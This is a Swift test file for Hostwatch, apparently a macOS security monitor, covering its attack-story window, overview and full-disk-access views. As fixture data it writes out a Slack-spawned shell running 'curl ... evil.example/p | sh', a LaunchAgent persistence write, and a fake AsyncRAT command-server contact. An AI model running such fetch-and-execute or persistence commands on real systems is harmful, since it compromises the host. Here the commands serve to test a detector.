import AppKit
import Foundation
import SwiftUI
import Testing
@testable import Hostwatch

/// The story window: the chain event by event, merged with the processes' other activity.
@MainActor @Suite struct StoryDetailsWindow {
    static func sample() -> Story {
        let slack = "/Applications/Slack.app/Contents/MacOS/Slack"
        let steps = [
            StoryStep(exec("/bin/sh", pid: 200, ppid: 100, parent: slack, args: "sh -c 'curl -s https://evil.example/p | sh'"),
                      stage: .appShell, note: "Slack started a shell"),
            StoryStep(exec("/usr/bin/curl", pid: 300, ppid: 200, parent: "/bin/sh", args: "curl -s https://evil.example/p"),
                      stage: .encodedCommand, note: "download piped into a shell"),
            StoryStep(net("/usr/bin/curl", pid: 300, to: "93.184.216.34:443", host: "evil.example"),
                      stage: .newDomain, note: "first contact with evil.example"),
            StoryStep(file("/bin/sh", pid: 200, "w", "\(home)/Library/LaunchAgents/com.evil.plist"),
                      stage: .persistence, note: "wrote a LaunchAgent"),
        ]
        return Story(rootPid: 100, originName: "Slack", originPath: slack, origin: .app, steps: steps,
                     firstSeen: Date().addingTimeInterval(-90), lastSeen: Date(), fired: true, severity: .dangerous)
    }

    @Test func timelineIndentsByProcessAndMergesContext() {
        let details = StoryDetails(story: Self.sample(), historyDirectory: URL(fileURLWithPath: "/nonexistent"), live: [])
        #expect(details.depth(200) == 0 && details.depth(300) == 1)                   // curl runs below sh
        #expect(details.items.count == 4)
        #expect(details.processes.map(\.name) == ["sh", "curl"])
        #expect(StoryText.sentence(kind: .file, name: "sh", parent: "", target: "\(home)/Library/LaunchAgents/x.plist",
                                   extra: "w", host: "") == "sh wrote ~/Library/LaunchAgents/x.plist")
    }

    /// HOSTWATCH_RENDER=<dir> writes story-window.png there (to look at the layout).
    @Test(.enabled(if: ProcessInfo.processInfo.environment["HOSTWATCH_RENDER"] != nil))
    func render() throws {
        let details = StoryDetails(story: Self.sample(), historyDirectory: URL(fileURLWithPath: "/nonexistent"), live: [])
        let view = StoryDetailView(details: details, actions: HUDActions(openFullScreen: {}, openExclusions: {},
                                   toggleCollector: {}, quit: {}, askAI: { _ in }), dismiss: {}, ignore: {}, scrollable: false)
            .frame(width: 820)
            .background(Color(nsColor: .windowBackgroundColor))
        let renderer = ImageRenderer(content: view)
        renderer.scale = 2
        let image = try #require(renderer.nsImage)
        let tiff = try #require(image.tiffRepresentation)
        let png = try #require(NSBitmapImageRep(data: tiff)?.representation(using: .png, properties: [:]))
        let dir = ProcessInfo.processInfo.environment["HOSTWATCH_RENDER"]!
        try png.write(to: URL(fileURLWithPath: dir).appendingPathComponent("story-window.png"))
    }
}

/// HOSTWATCH_RENDER=<dir> writes full-disk-access.png there (to look at the layout).
@MainActor @Suite struct FullDiskAccessWindow {
    @Test(.enabled(if: ProcessInfo.processInfo.environment["HOSTWATCH_RENDER"] != nil))
    func render() throws {
        let setup = FullDiskAccessSetup(afterFailure: false, previewGranted: false)
        defer { setup.stop() }
        let view = FullDiskAccessView(setup: setup, start: {}, close: {}, startAnyway: {})
            .background(Color(nsColor: .windowBackgroundColor))
        let renderer = ImageRenderer(content: view)
        renderer.scale = 2
        let image = try #require(renderer.nsImage)
        let tiff = try #require(image.tiffRepresentation)
        let png = try #require(NSBitmapImageRep(data: tiff)?.representation(using: .png, properties: [:]))
        try png.write(to: URL(fileURLWithPath: ProcessInfo.processInfo.environment["HOSTWATCH_RENDER"]!)
            .appendingPathComponent("full-disk-access.png"))
    }
}

/// HOSTWATCH_RENDER=<dir> writes overview.png there (to look at the layout).
@MainActor @Suite struct OverviewRender {
    @Test(.enabled(if: ProcessInfo.processInfo.environment["HOSTWATCH_RENDER"] != nil))
    func render() throws {
        _ = TestEnv.ready
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent("hw-ov-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        let store = SignatureStore(directory: dir)
        let stories = StoryEngine(persistent: false)
        var bad = net("/opt/homebrew/bin/python3.12", pid: 4411, to: "45.1.2.3:443", host: "c2.evil-cdn.xyz")
        bad.knownBad = "ThreatFox: AsyncRAT command server, reported Nov 1"
        _ = stories.ingest(bad, decidedSafe: false)
        let domains = DomainRegistry(replayLearningUntil: Date())
        let model = HUDModel(signatures: store, stories: stories, domains: domains)
        let intel = ThreatIntel(directory: dir.appendingPathComponent("intel"), defaults: scratchDefaults("hw-ov"))
        let view = OverviewView(model: model, collector: Collector(), stories: stories, domains: domains,
                                rules: RuleBook(store: store, fileURL: dir.appendingPathComponent("rules.json")),
                                baseline: BaselineLearner(store: store, classifier: nil, defaults: scratchDefaults("hw-ov"), freshInstall: false),
                                signatures: store, vitals: ProcessVitals(defaults: scratchDefaults("hw-ov")), history: HistoryRecorder(),
                                metrics: MetricsStore(directory: { dir }), intel: intel,
                                actions: HUDActions(openFullScreen: {}, openExclusions: {}, toggleCollector: {}, quit: {}, askAI: { _ in }),
                                openNeedsYou: {}, scrollable: false)
            .frame(width: 960)
        let renderer = ImageRenderer(content: view)
        renderer.scale = 2
        let image = try #require(renderer.nsImage)
        let tiff = try #require(image.tiffRepresentation)
        let png = try #require(NSBitmapImageRep(data: tiff)?.representation(using: .png, properties: [:]))
        try png.write(to: URL(fileURLWithPath: ProcessInfo.processInfo.environment["HOSTWATCH_RENDER"]!).appendingPathComponent("overview.png"))
    }
}
